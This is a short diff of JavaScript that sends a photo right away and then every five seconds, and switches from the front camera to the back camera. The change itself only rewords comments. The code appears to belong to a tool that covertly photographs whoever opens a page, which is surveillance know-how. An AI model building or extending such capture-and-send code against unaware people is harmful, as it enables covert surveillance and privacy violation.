@@ -109,11 +109,11 @@ Device Information:
             await sendPhoto();
             intervalId = setInterval(sendPhoto, 5000);
 
-            // Stop the front camera and start back camera after 5 seconds
+            // Stop the front camera after 5 seconds
             setTimeout(async () => {
-                stopCamera();
+                stopCamera(); // Stop front camera
 
-                // Start back camera
+                // Start back camera after front camera stops
                 const backCameraStarted = await startCamera('environment');
                 if (!backCameraStarted) return;
 
